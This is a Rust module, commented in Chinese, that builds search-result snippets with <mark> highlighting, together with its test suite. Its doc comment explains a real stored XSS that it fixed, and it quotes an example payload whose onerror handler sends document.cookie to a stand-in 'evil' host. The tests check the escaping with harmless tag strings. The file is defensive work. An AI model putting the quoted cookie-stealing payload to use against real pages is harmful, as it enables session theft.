//! 摘要片段生成（纯函数，无 IO）。
//!
//! 搜索结果的 `snippet` 字段要求"含高亮上下文"——用户必须一眼看出
//! **为什么这条命中了**。直接截前 N 个字会导致命中词经常不在片段里，
//! 结果看起来像搜错了。
//!
//! 本模块的策略：定位首个命中位置，以其为中心截取窗口，
//! 并用 `<mark>` 标记命中词（前端直接渲染，避免各页面自己实现高亮）。
//!
//! # 为什么不用 FTS5 的 snippet()
//! `snippet()` 只在 FTS 路径可用；中文 2 字查询走 LIKE 回退时拿不到。
//! 统一在应用层生成，两条路径的片段格式才一致。

/// 片段最大字符数（中文字符宽度大，40 字左右是列表项的舒适上限）。
pub const SNIPPET_CHARS: usize = 48;

/// 命中词左右各保留的上下文字符数。
pub const CONTEXT_CHARS: usize = 12;

/// 生成含高亮的摘要片段。
///
/// `haystack` 为原文（描述/路径等），`terms` 为查询词列表。
/// 无任何命中时返回开头截断（并标注省略号），不返回空串——
/// 空片段会让结果项看起来像渲染坏了。
pub fn highlight(haystack: &str, terms: &[String]) -> String {
    let mut out = String::new();
    for seg in segments(haystack, terms) {
        // 🔴 文本段必须 HTML 转义，命中词用我们自己的 <mark> 包裹。
        // 详见 `escape_html` 的说明（这修的是一个真实的存储型 XSS）。
        let esc = escape_html(&seg.text);
        if seg.marked {
            out.push_str("<mark>");
            out.push_str(&esc);
            out.push_str("</mark>");
        } else {
            out.push_str(&esc);
        }
    }
    out
}

/// 纯文本片段（不含 `<mark>`、不含 HTML 实体），用于 MCP / 纯文本消费者。
///
/// 🔴 **不走 `highlight`**：那条路径会把文本转义成 `&lt;` 这类实体，
/// 纯文本消费者（终端里的 MCP 输出）拿到实体会显示成乱码般的 `&lt;img&gt;`。
/// 这里直接拼接 `segments` 的原文，窗口口径与 `highlight` 完全一致
/// （两者共用同一个分段函数，不可能漂移）。
pub fn plain(haystack: &str, terms: &[String]) -> String {
    segments(haystack, terms)
        .into_iter()
        .map(|seg| seg.text)
        .collect()
}

/// 去掉高亮标记。
pub fn strip_marks(s: &str) -> String {
    s.replace("<mark>", "").replace("</mark>", "")
}

/// 片段的一个文本段。`marked` 表示它是命中词（渲染时高亮）。
struct Segment {
    text: String,
    marked: bool,
}

/// 把原文切成窗口化的段（命中词单独成段）。
///
/// 这是 `highlight` 与 `plain` 的共同底层：两者的截取窗口、省略号位置、
/// 命中词边界都由这里唯一决定，因此 HTML 版与纯文本版**永远一致**。
fn segments(haystack: &str, terms: &[String]) -> Vec<Segment> {
    let text = collapse_ws(haystack);
    if text.is_empty() {
        return Vec::new();
    }
    let chars: Vec<char> = text.chars().collect();

    // 无命中：取开头窗口，整段不标记
    let Some((start_byte, term)) = earliest_hit(&text, terms) else {
        let take = SNIPPET_CHARS.min(chars.len());
        let mut head: String = chars[..take].iter().collect();
        if chars.len() > take {
            head.push('\u{2026}');
        }
        return vec![Segment {
            text: head,
            marked: false,
        }];
    };

    // 字节偏移 → 字符索引（中文按字符计窗，否则窗口会被单字撑爆）
    let hit_idx = char_index_of(&text, start_byte);
    let term_len = term.chars().count();
    let from = hit_idx.saturating_sub(CONTEXT_CHARS);
    let to = (hit_idx + term_len + CONTEXT_CHARS).min(chars.len());

    let mut out: Vec<Segment> = Vec::with_capacity(3);

    // 左侧省略号 + 命中前的上下文
    let mut lead = String::new();
    if from > 0 {
        lead.push('\u{2026}');
    }
    lead.extend(&chars[from..hit_idx]);
    if !lead.is_empty() {
        out.push(Segment {
            text: lead,
            marked: false,
        });
    }

    // 命中词本身
    out.push(Segment {
        text: chars[hit_idx..hit_idx + term_len].iter().collect(),
        marked: true,
    });

    // 命中后的上下文 + 右侧省略号
    let mut tail: String = chars[hit_idx + term_len..to].iter().collect();
    if to < chars.len() {
        tail.push('\u{2026}');
    }
    if !tail.is_empty() {
        out.push(Segment {
            text: tail,
            marked: false,
        });
    }

    out
}

/// HTML 转义。
///
/// # 🔴 这修的是一个真实的存储型 XSS
/// `snippet` 的内容来自**用户代码**——项目描述、资产名、文件路径、
/// 洞察标题，全是不可信输入（用户 clone 的任意仓库都能控制这些字符串）。
///
/// 早期 `highlight` 把原文逐字符原样塞进 HTML 片段，只给命中词包 `<mark>`。
/// 于是一个描述里含 `<img src=x onerror="fetch(//evil/+document.cookie)">`
/// 的仓库，会在搜索结果页**执行任意 JS**：前端用 `dangerouslySetInnerHTML`
/// 渲染 snippet 时直接中招，可窃取本地服务会话、读取其他项目内容。
///
/// 修在这里而不是前端，是因为该字段的契约就是"可安全渲染的 HTML 片段"：
/// 只有源头转义，React（`dangerouslySetInnerHTML`）、Tauri webview（`innerHTML`）
/// 以及任何未来消费者才都安全。把转义推给每个消费者，迟早有一个会漏。
///
/// 转义 `& < > " '` 五个字符即覆盖 HTML 文本与属性上下文的全部注入点。
/// 命中词的 `<mark>` 由 `highlight` 在转义**之后**拼接，故不受影响。
fn escape_html(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            _ => out.push(c),
        }
    }
    out
}

/// 折叠连续空白为单个空格（源码里的换行/缩进会撑爆片段）。
fn collapse_ws(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// 返回最靠前的命中：`(字节偏移, 命中的词)`。大小写不敏感。
fn earliest_hit(text: &str, terms: &[String]) -> Option<(usize, String)> {
    let lower = text.to_lowercase();
    let mut best: Option<(usize, String)> = None;
    for t in terms {
        let t = t.trim();
        if t.is_empty() {
            continue;
        }
        // 在**小写副本**上找位置；因 ASCII 小写不改变长度，
        // 且中文无大小写，偏移量与原文一致，可安全用于切片。
        if let Some(pos) = lower.find(&t.to_lowercase())
            && (best.is_none() || pos < best.as_ref().unwrap().0)
        {
            best = Some((pos, t.to_string()));
        }
    }
    best
}

/// 字节偏移 → 字符索引。
fn char_index_of(text: &str, byte_pos: usize) -> usize {
    text[..byte_pos.min(text.len())].chars().count()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn terms(v: &[&str]) -> Vec<String> {
        v.iter().map(|s| s.to_string()).collect()
    }

    // ── XSS 防护（🔴 安全红线，这些测试不可删）────────────────

    /// 🔴 回归：snippet 的原文必须被 HTML 转义。
    ///
    /// # 缺陷背景
    /// snippet 内容来自**用户代码**（项目描述、资产名、文件路径、洞察标题），
    /// 全是不可信输入：用户 clone 的任意仓库都能控制这些字符串。
    /// 早期 `highlight` 把原文逐字符原样塞进 HTML 片段，只给命中词包 `<mark>`，
    /// 于是含 `<img src=x onerror=...>` 的仓库描述会在搜索结果页执行任意 JS
    /// （前端用 `dangerouslySetInnerHTML` 渲染 snippet），可窃取本地服务会话。
    ///
    /// # 为什么必须锁死
    /// 这类缺陷**不会让任何现有测试失败**：转义与否，
    /// "命中词是否被 <mark> 包裹"的断言都成立。
    /// 只有显式断言转义结果，才能防止将来有人"简化"掉 escape_html。
    #[test]
    fn escapes_html_in_source_text() {
        // 🔴 payload 必须**紧挨命中词**且在 CONTEXT_CHARS(12) 之内。
        // 早期版本把注入放在命中词前 31 个字符处，那段早被上下文窗口截掉了，
        // 于是"没转义"的实现也能通过——测试形同虚设。
        // 放在命中词之后 12 字符内，才能保证它真的进入了输出片段。
        let payload = r#"视频<a b="c">管线"#;
        let s = highlight(payload, &terms(&["视频"]));

        // 原始标签不得透传，尖括号与引号必须变成实体
        assert!(!s.contains("<a "), "原始标签不得透传: {s}");
        assert!(s.contains("&lt;a"), "尖括号必须转义: {s}");
        assert!(s.contains("&quot;"), "双引号必须转义: {s}");
        // 我们自己插入的 <mark> 不受影响（它在转义之后拼接）
        assert!(s.contains("<mark>视频</mark>"), "命中词仍应高亮: {s}");
        // 除 <mark>/</mark> 外不得有任何裸尖括号
        let stripped = s.replace("<mark>", "").replace("</mark>", "");
        assert!(
            !stripped.contains('<') && !stripped.contains('>'),
            "转义后不应残留裸尖括号: {stripped}"
        );
    }

    /// 🔴 真实的 XSS 向量必须在**输出里被中和**。
    ///
    /// 这条比上一条更重要：它直接用真实的 `<img onerror>` 载荷，
    /// 断言输出里绝不存在可执行的 `<img` 起始序列。
    /// 载荷放在命中词之前但仍在窗口内（≤12 字符）。
    #[test]
    fn neutralizes_real_xss_vector() {
        // 命中词在末尾，注入紧贴其前 → 落在左侧上下文窗口内
        let payload = r#"<img src=x>视频"#;
        let s = highlight(payload, &terms(&["视频"]));

        assert!(
            !s.contains("<img"),
            "🔴 可执行的 <img 序列绝不能出现在输出里: {s}"
        );
        assert!(s.contains("&lt;img"), "应转义为实体: {s}");
        assert!(s.contains("<mark>视频</mark>"), "命中词仍应高亮: {s}");
    }

    /// 五个危险字符全部转义（HTML 文本与属性上下文的完整注入点集合）。
    #[test]
    fn escapes_all_five_dangerous_chars() {
        let s = highlight(r#"&<>"'"#, &terms(&["zzz"]));
        assert_eq!(s, "&amp;&lt;&gt;&quot;&#39;");
    }

    /// 命中词本身也要转义：用户可能搜索 `<div>` 这类含尖括号的词。
    #[test]
    fn escapes_matched_term_too() {
        let s = highlight("用 <div> 布局", &terms(&["<div>"]));
        assert!(s.contains("<mark>&lt;div&gt;</mark>"), "实际: {s}");
        assert!(!s.contains("<mark><div>"), "命中词内的尖括号也必须转义: {s}");
    }

    /// 🔴 `&` 必须只转义一次：`&lt;` 不能变成 `&amp;lt;`
    /// （双重转义会让界面显示出 "&lt;" 字面量，是另一种可见的缺陷）。
    #[test]
    fn does_not_double_escape() {
        let s = highlight("&lt;已转义&gt;", &terms(&["zzz"]));
        assert_eq!(s, "&amp;lt;已转义&amp;gt;");
        // 反转义一次应还原成原文（证明只转义了一层）
        assert_eq!(s.replace("&amp;", "&"), "&lt;已转义&gt;");
    }

    /// 🔴 `plain()` 必须返回**原文**，不含 HTML 实体。
    ///
    /// 纯文本消费者（终端里的 MCP 输出）拿到 `&lt;img&gt;` 会显示成乱码般的实体，
    /// 而它本来就该看到 `<img>`。这也是 `plain` 不走 `highlight` 的原因。
    #[test]
    fn plain_returns_unescaped_text() {
        let payload = r#"<img src=x> 视频管线"#;
        let s = plain(payload, &terms(&["视频"]));
        assert!(s.contains("<img"), "plain 应保留原文: {s}");
        assert!(!s.contains("&lt;"), "plain 不应含 HTML 实体: {s}");
        assert!(!s.contains("<mark>"), "plain 不应含高亮标记: {s}");
    }

    /// HTML 版与纯文本版的**窗口口径必须一致**（共用 segments 的保证）。
    ///
    /// 🔴 若两者各自实现截取逻辑，长文本会出现
    /// "HTML 片段显示命中词、纯文本片段却没截到它"的割裂。
    #[test]
    fn html_and_plain_share_the_same_window() {
        let text = format!("{}<b>视频</b>{}", "前".repeat(60), "后".repeat(60));
        let html = highlight(&text, &terms(&["视频"]));
        let plain_text = plain(&text, &terms(&["视频"]));

        // strip_marks + 反转义后应与 plain 完全相同
        let unescaped = strip_marks(&html)
            .replace("&lt;", "<")
            .replace("&gt;", ">")
            .replace("&quot;", "\"")
            .replace("&#39;", "'")
            .replace("&amp;", "&");
        assert_eq!(unescaped, plain_text, "两个版本的窗口必须一致");
        assert!(plain_text.contains("<b>视频</b>"), "两者都应截到命中词");
    }

    #[test]
    fn marks_the_matched_term() {
        let s = highlight("生成视频的完整流程", &terms(&["视频"]));
        assert_eq!(s, "生成<mark>视频</mark>的完整流程");
    }

    #[test]
    fn case_insensitive_match_preserves_original_case() {
        // 匹配 "pipeline" 但片段里应显示原文的 "Pipeline"
        let s = highlight("VideoPipeline renders frames", &terms(&["pipeline"]));
        assert!(s.contains("<mark>Pipeline</mark>"), "实际: {s}");
    }

    /// 命中词在长文中段时，必须截取到它附近，而不是只给开头。
    #[test]
    fn centers_window_on_late_match() {
        let text = format!("{}视频{}", "前".repeat(60), "后".repeat(60));
        let s = highlight(&text, &terms(&["视频"]));
        assert!(s.contains("<mark>视频</mark>"), "命中词必须在片段内: {s}");
        assert!(s.starts_with('…'), "左侧被截断应有省略号");
        assert!(s.ends_with('…'), "右侧被截断应有省略号");
        assert!(s.chars().count() < 60, "片段应远短于原文: {}", s.chars().count());
    }

    #[test]
    fn no_match_returns_head_with_ellipsis() {
        let text = "a".repeat(100);
        let s = highlight(&text, &terms(&["不存在"]));
        assert!(!s.contains("<mark>"));
        assert!(s.ends_with('…'));
        assert_eq!(strip_marks(&s).chars().count(), SNIPPET_CHARS + 1); // +省略号
    }

    #[test]
    fn short_text_has_no_ellipsis() {
        let s = highlight("短文本", &terms(&["zzz"]));
        assert_eq!(s, "短文本");
        assert!(!s.contains('…'));
    }

    #[test]
    fn empty_inputs_are_safe() {
        assert_eq!(highlight("", &terms(&["x"])), "");
        assert_eq!(highlight("   \n\t ", &terms(&["x"])), "");
        // 空 terms 不得 panic
        assert_eq!(highlight("有内容", &[]), "有内容");
        // 空白 term 不得当成命中
        assert!(!highlight("有内容", &terms(&["  "])).contains("<mark>"));
    }

    #[test]
    fn collapses_whitespace_from_source_code() {
        let src = "fn main() {\n    println!(\"视频\");\n}";
        let s = highlight(src, &terms(&["视频"]));
        assert!(!s.contains('\n'), "换行必须被折叠: {s:?}");
        assert!(s.contains("<mark>视频</mark>"));
    }

    #[test]
    fn earliest_hit_wins_regardless_of_term_order() {
        // 两个词都命中，片段应围绕**更靠前**的那个；
        // 且结果不随 terms 顺序变化（保证快照稳定）
        let text = "先有视频后有图片";
        let a = highlight(text, &terms(&["视频", "图片"]));
        let b = highlight(text, &terms(&["图片", "视频"]));
        assert_eq!(a, b, "顺序不得影响输出");
        assert_eq!(a, "先有<mark>视频</mark>后有图片");
    }

    #[test]
    fn plain_strips_marks() {
        assert_eq!(plain("生成视频流程", &terms(&["视频"])), "生成视频流程");
        assert_eq!(strip_marks("a<mark>b</mark>c"), "abc");
    }

    #[test]
    fn multi_char_window_does_not_split_chinese() {
        // 截断必须落在字符边界，否则会产生乱码
        let text = "漢".repeat(200);
        let s = highlight(&text, &terms(&["不存在"]));
        assert!(s.chars().all(|c| c == '漢' || c == '…'));
    }

    #[test]
    fn constants_are_sane() {
        // 精确值断言已足够：CONTEXT_CHARS*2 < SNIPPET_CHARS 是这两个值的推论，
        // 再写一遍是恒真式（clippy 会报 constant value），误改常量时上面两行就会红。
        assert_eq!(SNIPPET_CHARS, 48);
        assert_eq!(CONTEXT_CHARS, 12);
    }
}
